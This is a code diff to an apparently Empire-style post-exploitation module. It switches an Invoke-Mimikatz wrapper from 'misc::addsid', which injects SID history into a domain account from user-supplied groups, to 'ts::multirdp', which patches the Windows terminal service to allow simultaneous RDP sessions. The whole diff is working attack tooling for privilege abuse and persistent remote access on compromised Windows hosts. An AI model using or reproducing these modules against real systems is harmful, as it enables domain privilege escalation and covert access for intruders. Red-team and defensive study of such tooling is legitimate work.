@@ -5,13 +5,13 @@ class Module:
     def __init__(self, mainMenu, params=[]):
 
         self.info = {
-            'Name': 'Invoke-Mimikatz Add-SIDHistory',
+            'Name': 'Invoke-Mimikatz Multirdp',
 
-            'Author': ['@JosephBialek', '@gentilkiwi'],
+            'Author': ['@gentilkiwi', '@JosephBialek'],
 
-            'Description': ("Runs PowerSploit's Invoke-Mimikatz function "
-                            "to execute misc::addsid to add sid history for a user. "
-                            "ONLY APPLICABLE ON DOMAIN CONTROLLERS!"),
+            'Description': ("[!] WARNING: Experimental! Runs PowerSploit's Invoke-Mimikatz "
+                            "function to patch the Windows terminal service to allow "
+                            "multiple users to establish simultaneous RDP connections."),
 
             'Background' : True,
 
@@ -24,8 +24,8 @@ class Module:
             'MinPSVersion' : '2',
             
             'Comments': [
-                'http://clymb3r.wordpress.com/',
-                'http://blog.gentilkiwi.com'
+                'http://blog.gentilkiwi.com',
+                'http://clymb3r.wordpress.com/'
             ]
         }
 
@@ -35,16 +35,6 @@ class Module:
             #   value_name : {description, required, default_value}
             'Agent' : {
                 'Description'   :   'Agent to run module on.',
-                'Required'      :   True,
-                'Value'         :   ''
-            },
-            'User' : {
-                'Description'   :   'User to add sidhistory for.',
-                'Required'      :   True,
-                'Value'         :   ''                
-            },
-            'Groups' : {
-                'Description'   :   'Groups/users to add to the sidhistory of the target user (COMMA-separated).',
                 'Required'      :   True,
                 'Value'         :   ''
             }
@@ -77,13 +67,6 @@ class Module:
 
         script = moduleCode
 
-        # ridiculous escape format
-        groups = " ".join(['"\\""'+group.strip().strip("'\"")+'"""' for group in self.options["Groups"]['Value'].split(",")])
-
-        # build the custom command with whatever options we want
-        command = '""misc::addsid '+self.options["User"]['Value'] + ' ' + groups
-
-        # base64 encode the command to pass to Invoke-Mimikatz
-        script += "Invoke-Mimikatz -Command '\"" + command + "\"';"
+        script += "Invoke-Mimikatz -Command '\"ts::multirdp\"';"
 
         return script
